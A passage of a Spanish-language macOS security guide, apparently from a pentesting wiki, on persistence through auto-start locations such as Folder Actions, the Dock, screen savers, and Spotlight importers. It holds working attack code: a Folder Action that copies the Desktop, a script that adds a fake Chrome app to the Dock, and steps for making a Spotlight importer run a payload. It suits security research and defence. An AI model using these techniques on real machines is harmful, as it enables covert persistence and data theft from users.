cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> Si las tareas AT no están habilitadas, las tareas creadas no se ejecutarán.

Los **archivos de tareas** se encuentran en `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

El nombre del archivo contiene la cola, el número del trabajo y la hora programada para ejecutarse. Por ejemplo, veamos `a0001a019bdcd2`.

- `a`: esta es la cola
- `0001a`: número del trabajo en hexadecimal, `0x1a = 26`
- `019bdcd2`: hora en hexadecimal. Representa los minutos transcurridos desde la época Unix. `0x019bdcd2` equivale a `26991826` en decimal. Si lo multiplicamos por 60, obtenemos `1619509560`, que corresponde a `GMT: martes, 27 de abril de 2021, 7:46:00`.

Si mostramos el archivo del trabajo, vemos que contiene la misma información que obtuvimos con `at -c`.

### Alertas de apertura de archivos de Calendar

- **Destino de escritura:** Un paquete de aplicación ejecutable u otro archivo **ya seleccionado** por la alerta personalizada **Open file** de un evento de Calendar. Crear o editar la alerta requiere acceso al evento mediante Calendar o una fuente de datos de Calendar autorizada; escribir en un archivo cualquiera no crea una alerta.
- **Activación:** La hora programada de la alerta en un Mac donde Calendar procese el evento. Un evento recurrente puede repetir la acción. [La guía actual de Calendar de Apple](https://support.apple.com/guide/calendar/icl1012/mac) confirma la opción de alerta **Custom → Open file** en macOS 26.
- **Identidad de ejecución y controles:** Calendar abre el archivo elegido para el usuario que inició sesión mediante la aplicación asociada. Abrir un paquete de aplicación puede ejecutar su código como ese usuario, sujeto a Gatekeeper, cuarentena y otras comprobaciones de macOS. Un archivo de script normal puede limitarse a abrirse en un editor; su extensión, por sí sola, no demuestra que se ejecute código.

Para evaluar un candidato de forma segura, inspecciona la alerta del evento en Calendar y los permisos del archivo seleccionado. Esta vía se documentó a partir de la guía de Apple y **no** se probó en el Mac de investigación, ya que hacerlo habría modificado un calendario activo y habría requerido esperar a un evento del escritorio. En una cuenta desechable, se puede seleccionar un paquete de aplicación que solo cree un marcador, configurar una alerta Open file para una hora cercana, confirmar que se inicia y luego eliminar el evento y la aplicación.

### Automatizaciones de Shortcuts en macOS

- **Destino de escritura:** Un archivo ejecutable **ya referenciado** por una acción de un shortcut, o un shortcut existente que un usuario autorizado pueda editar. Un archivo `.shortcut` cualquiera o escribir en una base de datos no documentada de Shortcuts no es un método compatible para registrar una automatización.
- **Activación e identidad:** Un evento de automatización configurado y habilitado previamente, como una hora del día o un evento de una app, ejecuta el shortcut para el usuario que inició sesión. [La guía actual de automatizaciones para Mac de Apple](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) enumera los eventos compatibles, explica cuándo una automatización puede ejecutarse sin preguntar y describe cómo eliminar un desencadenador. [La guía de privacidad de Shortcuts de Apple](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) requiere **Allow Running Scripts** para las acciones de script, y las acciones individuales aún pueden solicitar permisos.

Esta es una vía condicional de escritura a ejecución **solo cuando la acción existente carga un destino en el que se puede escribir**. Crear una automatización nueva mediante la interfaz cambia la configuración activa y no se intentó en el Mac de investigación. En una cuenta desechable, el propietario puede configurar un shortcut programado para una hora del día cuyo script cree `/tmp/ht-shortcuts-marker`, habilitar los permisos necesarios, comprobar que el marcador aparece después del evento y, luego, eliminar la automatización, el shortcut y el marcador.

### Acciones de Automator y Quick Actions

- **Destinos de escritura:** `~/Library/Automator/*.action` (usuario) y `/Library/Automator/*.action` (administrador) para paquetes de acciones. Un flujo de trabajo Quick Action guardado suele estar en `~/Library/Services/*.workflow`; comprueba la ruta real del flujo de trabajo seleccionado por el usuario. [La referencia del framework Automator de Apple](https://developer.apple.com/documentation/automator) enumera los directorios donde se buscan las acciones.
- **Activación:** Automator carga los paquetes de acciones disponibles cuando se ejecuta, pero la tarea de una acción se ejecuta cuando se inicia un flujo de trabajo que la utiliza. Una Quick Action se ejecuta cuando el usuario la selecciona en Finder, Services u otro menú disponible. Un flujo de trabajo Folder Action se ejecuta cuando se añaden elementos a su carpeta **ya asociada**, y un flujo de trabajo Calendar Alarm se ejecuta a la hora del evento. [Los tipos de flujos de trabajo de Apple](https://support.apple.com/guide/automator/aut7cac58839/mac) distinguen estos eventos. Escribir una acción o un flujo de trabajo no asocia una carpeta ni programa un evento de Calendar.
- **Identidad de ejecución y controles:** La cuenta que ejecuta el flujo de trabajo; Automator o la app que lo invoca debe cargar la acción, y las comprobaciones actuales de firma de código y privacidad deben permitirlo. Un paquete de acciones en el que se puede escribir y que ya está referenciado por un flujo de trabajo activo es un caso distinto al de instalar una acción nueva y esperar a que se seleccione.

Los directorios del usuario `Automator` y `Services` estaban presentes en el Mac de prueba con macOS 26.5.2; `/Library/Automator` no existía. No se creó, asoció ni ejecutó ningún flujo de trabajo activo. Usa una cuenta desechable y una acción o flujo de trabajo que solo cree un marcador para confirmar una ruta de carga específica. La sección independiente [Folder Actions](#folder-actions) cubre con más detalle esa fuente de eventos.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Útil para eludir el sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Pero necesitas poder llamar a `osascript` con argumentos para contactar con **`System Events`** y configurar Folder Actions
- Elusión de TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Tiene algunos permisos básicos de TCC, como Desktop, Documents y Downloads

#### Ubicación

- **`/Library/Scripts/Folder Action Scripts`**
  - Se requieren privilegios de root
  - **Activación**: Acceso a la carpeta especificada
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Activación**: Acceso a la carpeta especificada

#### Descripción y explotación

Folder Actions son scripts que se activan automáticamente cuando se producen cambios en una carpeta, como añadir o eliminar elementos, o realizar otras acciones, como abrir o cambiar el tamaño de la ventana de la carpeta. Estas acciones pueden utilizarse para distintas tareas y activarse de varias maneras, por ejemplo, mediante la interfaz de Finder o comandos de terminal.<sup>[[17]](#references)[[18]](#references)</sup>

Para configurar Folder Actions, puedes:

1. Crear un flujo de trabajo Folder Action con [Automator](https://support.apple.com/guide/automator/welcome/mac) e instalarlo como servicio.
2. Asociar un script manualmente mediante Folder Actions Setup, en el menú contextual de una carpeta.
3. Utilizar OSAScript para enviar mensajes Apple Event a `System Events.app` y configurar una Folder Action de forma programática.
   - Este método resulta especialmente útil para integrar la acción en el sistema y ofrecer cierto grado de persistencia.

El siguiente script es un ejemplo de lo que puede ejecutar una Folder Action:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Para que el script anterior pueda usarse con Folder Actions, compílalo usando:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Después de compilar el script, configura Folder Actions ejecutando el siguiente script. Este habilitará Folder Actions globalmente y asociará específicamente el script compilado anteriormente a la carpeta Escritorio.

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

Ejecuta el script de configuración con:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- Esta es la forma de implementar esta persistencia mediante GUI:

Este es el script que se ejecutará:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Compílalo con: `osacompile -l JavaScript -o folder.scpt source.js`

Muévelo a:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Luego, abre la app `Folder Actions Setup`, selecciona la **carpeta que quieras supervisar** y, en tu caso, selecciona **`folder.scpt`** (en mi caso, la llamé output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Ahora, si abres esa carpeta con **Finder**, se ejecutará tu script.

Esta configuración se guardó en formato base64 en el **plist** ubicado en **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**.

Ahora, intentemos preparar esta persistencia sin acceso a la GUI:

1. **Copia `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** en `/tmp` para hacer una copia de seguridad:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Elimina** las Folder Actions que acabas de configurar:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Ahora que tenemos un entorno vacío:

3. Copia el archivo de copia de seguridad: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Abre `Folder Actions Setup.app` para cargar esta configuración: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Esto no me funcionó, pero esas son las instrucciones del writeup:(

### Atajos del Dock

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Útil para evadir el sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Pero debes tener una aplicación maliciosa instalada en el sistema
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- `~/Library/Preferences/com.apple.dock.plist`
  - **Activador**: Cuando el usuario hace clic en la app del dock

#### Descripción y explotación

Todas las aplicaciones que aparecen en el Dock se especifican en el plist: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

Es posible **añadir una aplicación** simplemente con:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

Usando algo de **ingeniería social**, podrías **suplantar, por ejemplo, a Google Chrome** en el dock y ejecutar realmente tu propio script:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Métodos de entrada

- **Objetivo de escritura:** Un bundle de app de método de entrada con código instalado en `~/Library/Input Methods/` (usuario) o `/Library/Input Methods/` (administrador). Esto es distinto de los archivos de asignación de teclado `.inputplugin` de texto sin formato de Apple, que por sí solos no son una carga útil de código arbitrario.
- **Activación:** El usuario añade/activa la fuente de entrada en **Ajustes del Sistema → Teclado → Entrada de texto** y luego la selecciona o la usa. Que un bundle se copie en el directorio no demuestra que macOS vaya a iniciarlo. La [guía actual de Apple sobre fuentes de entrada](https://support.apple.com/guide/mac-help/mchl84525d76/mac) describe cómo activarlas y cambiar entre ellas; la [documentación de Apple sobre InputMethodKit](https://developer.apple.com/documentation/inputmethodkit) trata los métodos de entrada con código.
- **Identidad de ejecución y controles:** El método se ejecuta con la identidad del usuario que inició sesión, sujeto al registro del método de entrada, la firma de código y las comprobaciones de seguridad actuales de macOS. Los métodos ya activados cuyo ejecutable sea modificable requieren una revisión aparte de la ruta y la firma.

La [antigua nota de Apple sobre métodos de entrada de terceros](https://developer.apple.com/library/archive/qa/qa1810/_index.html) ya advertía que copiar ciertos métodos de paleta a estos directorios ni siquiera hace que aparezcan en Fuentes de entrada. En el Mac de investigación con macOS 26.5.2, el directorio del usuario existe, pero no había ningún bundle instalado ni activado; por tanto, se trata de una ruta condicional documentada, no de un resultado de ejecución local.

### Selectores de color

Artículo: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Útil para eludir el sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Debe producirse una acción muy específica
  - Terminarás en otro sandbox
- Elusión de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- `/Library/ColorPickers`
  - Se requiere root
  - Activación: Usar el selector de color
- `~/Library/ColorPickers`
  - Activación: Usar el selector de color

#### Descripción y exploit

**Compila un bundle de selector de color** con tu código (puedes usar [**este, por ejemplo**](https://github.com/viktorstrate/color-picker-plus)) y añade un constructor (como en la [sección Salvapantallas](macos-auto-start-locations.md#screen-saver)); luego copia el bundle a `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Después, cuando se active el selector de color, tu bundle también debería ejecutarse.

Esto depende de que una app compatible abra el panel de color del sistema y seleccione el selector instalado. La [guía de Apple sobre el panel de color](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) describe las ubicaciones heredadas de los bundles. Una comprobación local de rutas encontró el servicio XPC heredado del selector de color, pero no había ningún selector instalado ni cargado en el Mac de investigación; no deduzcas que existe una elusión de TCC solo por la ruta.

Ten en cuenta que el binario que carga tu biblioteca tiene un **sandbox muy restrictivo**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Plugins de Finder Sync

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Útil para evadir el sandbox: **No, porque necesitas ejecutar tu propia app**
- Bypass de TCC: depende del sandbox y los permisos de la extensión habilitada; no se ha establecido ningún bypass general.

#### Ubicación

- Una app específica

#### Descripción y exploit

Aquí puedes encontrar [**un ejemplo de aplicación**](https://github.com/D00MFist/InSync) con una Finder Sync Extension.

Las aplicaciones pueden tener `Finder Sync Extensions`. Esta extensión se incluye en una aplicación que se ejecutará. Además, para que la extensión pueda ejecutar su código, **debe estar firmada** con un certificado válido de desarrollador de Apple, debe estar **aislada en un sandbox** (aunque se pueden añadir excepciones menos restrictivas) y debe registrarse con algo como:<sup>[[21]](#references)[[22]](#references)</sup>

Una extensión instalada también debe estar **habilitada** y activarse para una ubicación o elemento pertinente de Finder; escribir un bundle `.appex` arbitrario no es suficiente. [La API Finder Sync de Apple](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) permite consultar el estado de habilitación. Los comandos `pluginkit` que aparecen a continuación muestran el registro y la habilitación explícitos, no un inicio automático basado únicamente en archivos. Esta vía se revisó mediante documentación, sin instalar ni habilitar ninguna extensión nueva en el Mac de investigación.

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Protector de pantalla

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Útil para evadir el sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Pero acabarás en un sandbox de aplicación común
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- `/System/Library/Screen Savers`
  - Se requieren privilegios de root
  - **Activación**: Selecciona el protector de pantalla
- `/Library/Screen Savers`
  - Se requieren privilegios de root
  - **Activación**: Selecciona el protector de pantalla
- `~/Library/Screen Savers`
  - **Activación**: Selecciona el protector de pantalla

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Descripción y explotación

Crea un proyecto nuevo en Xcode y selecciona la plantilla para generar un nuevo **Screen Saver**. Luego, añade tu código; por ejemplo, el siguiente código para generar logs.<sup>[[23]](#references)[[24]](#references)</sup>

**Compílalo** y copia el bundle `.saver` a **`~/Library/Screen Savers`**. Luego, abre la interfaz gráfica de Screen Saver y, con solo hacer clic en él, debería generar muchos logs:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> Ten en cuenta que, debido a que en los entitlements del binario que carga este código (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) puedes encontrar **`com.apple.security.app-sandbox`**, estarás **dentro del sandbox común de la aplicación**.

Código del salvapantallas:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Complementos de Spotlight

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Útil para bypass de sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Pero terminarás dentro de un application sandbox
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)
  - El sandbox parece muy limitado

#### Ubicación

- `~/Library/Spotlight/`
  - **Disparador**: Se crea un archivo nuevo con una extensión gestionada por el plugin de Spotlight.
- `/Library/Spotlight/`
  - **Disparador**: Se crea un archivo nuevo con una extensión gestionada por el plugin de Spotlight.
  - Se requiere root
- `/System/Library/Spotlight/`
  - **Disparador**: Se crea un archivo nuevo con una extensión gestionada por el plugin de Spotlight.
  - Se requiere root
- `Some.app/Contents/Library/Spotlight/`
  - **Disparador**: Se crea un archivo nuevo con una extensión gestionada por el plugin de Spotlight.
  - Se requiere una app nueva

#### Descripción y explotación

Spotlight es la función de búsqueda integrada de macOS, diseñada para brindar a los usuarios **acceso rápido y completo a los datos de sus computadoras**.\
Para facilitar esta capacidad de búsqueda rápida, Spotlight mantiene una **base de datos propietaria** y crea un índice mediante el **análisis de la mayoría de los archivos**, lo que permite realizar búsquedas rápidas tanto en los nombres de archivo como en su contenido.<sup>[[25]](#references)</sup>

El mecanismo subyacente de Spotlight utiliza un proceso central llamado «mds», que significa **«servidor de metadatos»**. Este proceso coordina todo el servicio Spotlight. Además, hay varios demonios «mdworker» que realizan diversas tareas de mantenimiento, como indexar distintos tipos de archivo (`ps -ef | grep mdworker`). Estas tareas son posibles gracias a los plugins importadores de Spotlight, o **«bundles .mdimporter»**, que permiten a Spotlight comprender e indexar contenido en una gran variedad de formatos de archivo.

Los plugins o bundles **`.mdimporter`** se encuentran en las ubicaciones mencionadas anteriormente. Debe detectarse un bundle nuevo y este debe corresponder a un tipo de archivo; además, Spotlight debe indexar realmente un archivo compatible. Copiar un bundle por sí solo no demuestra que se haya cargado. La [referencia de MDImporter de Apple](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) vincula la carga con un archivo apto que haya cambiado. Aquí no se probó la ejecución de importadores de Spotlight en macOS 26.

Es posible **encontrar todos los `mdimporters`** cargados ejecutando:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

Y, por ejemplo, **/Library/Spotlight/iBooksAuthor.mdimporter** se usa para analizar este tipo de archivos (extensiones `.iba` y `.book`, entre otras):

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> Si revisas el Plist de otros `mdimporter`, puede que no encuentres la entrada **`UTTypeConformsTo`**. Esto se debe a que es un _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier) ) integrado y no necesita especificar extensiones.
>
> Además, los plugins predeterminados del sistema siempre tienen prioridad, así que un atacante solo puede acceder a archivos que no estén indexados por los propios `mdimporters` de Apple.

Para crear tu propio importer, puedes empezar con este proyecto: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) y luego cambiar el nombre, **`CFBundleDocumentTypes`** y añadir **`UTImportedTypeDeclarations`** para que admita la extensión que quieras y reflejarla en **`schema.xml`**.\
Después, **cambia** el código de la función **`GetMetadataForFile`** para ejecutar tu payload cuando se cree un archivo con la extensión procesada.

Por último, **compila y copia tu nuevo `.mdimporter`** en una de las tres ubicaciones anteriores. Puedes comprobar si está cargado **supervisando los logs** o ejecutando **`mdimport -L`**.

> [!TIP]
> Aunque el sandbox del importer es muy restrictivo, `mdworker` indexa archivos con **acceso de lectura privilegiado**. Por lo tanto, un `.mdimporter` malicioso puede leer el *contenido* de archivos en ubicaciones protegidas por TCC (Downloads, Pictures, Desktop, …) y exfiltrar los metadatos recopilados sin ningún aviso de TCC: el bypass de TCC **"Sploitlight" (CVE-2025-31199)**, corregido en macOS Sequoia 15.4.<sup>[[55]](#references)</sup>

### ~~Panel de preferencias~~

> [!CAUTION]
> No parece que esto siga funcionando.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Útil para evadir el sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Requiere una acción específica del usuario
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Descripción

No parece que esto siga funcionando.<sup>[[26]](#references)</sup>

### Archivos de script de aplicaciones

Writeup: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Útil para evadir el sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Pero la aplicación objetivo debe estar instalada y la víctima debe ejecutarla o usarla
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

Un **script interpretado que una aplicación o herramienta instalada ejecuta realmente** y que el actor puede modificar. Comprueba los permisos del archivo y la ruta de invocación; encontrar un archivo `.sh` o `.py` por sí solo no es suficiente. La [guía de firma de código](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) de Apple indica que los bundles de aplicaciones firmados sellan los recursos, incluidos los scripts. Editar un script dentro del bundle rompe ese sello y puede detectarse o bloquearse al validar el bundle. Un script externo, como el launcher de Homebrew, tiene un comportamiento distinto en cuanto a firma y confianza. Los ejemplos históricos del writeup incluyen:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`**: un script usado por versiones anteriores de Sublime Text; hay que comprobar que el archivo exista y se use durante el inicio en la versión instalada. No estaba presente en el Mac de prueba.
- **`/opt/homebrew/bin/brew`** (Apple Silicon) o **`/usr/local/bin/brew`** (Intel): un launcher de Bash que se ejecuta cuando se invoca esa ruta de `brew`, si está instalado y el actor tiene permisos de escritura. `/opt/homebrew/bin/brew` era un script de Bash con permisos de escritura en el Mac de prueba; esto es una observación local, no una regla general sobre los permisos de Homebrew.
- **`idlemain.py` de IDLE**, dentro de un bundle de aplicación de Python: puede requerir permisos de administrador para escribir, pero se ejecuta con la identidad del usuario de IDLE.
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`**: un script de shell histórico que se ejecutaba como root cuando estaba instalada la tarea launchd correspondiente, `org.wireshark.ChmodBPF`. El script y la tarea no estaban presentes en el Mac de prueba.

#### Descripción y explotación

Algunas herramientas y aplicaciones ejecutan scripts interpretados durante el tiempo de ejecución. Un script con permisos de escritura puede ejecutar comandos añadidos la próxima vez que se ejecute su caller específico, siempre que la validación de firmas, la cuarentena y otras comprobaciones lo permitan. La investigación original mostró varias instalaciones de 2019; vuelve a comprobar sus rutas y desencadenantes en la versión objetivo.<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

Esta prueba de copia produjo `marker fired: True` en macOS 26.5.2; el lanzador original no se modificó. Demuestra que el punto de inserción se ejecuta en la copia, no que un bundle de app firmado modificado o una instalación real de Homebrew supere todas las comprobaciones de inicio.

### Dock Tile Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- Útil para evadir el sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Requiere que una app que declare el plug-in sea detectada y registrada, y que el Dock lo procese
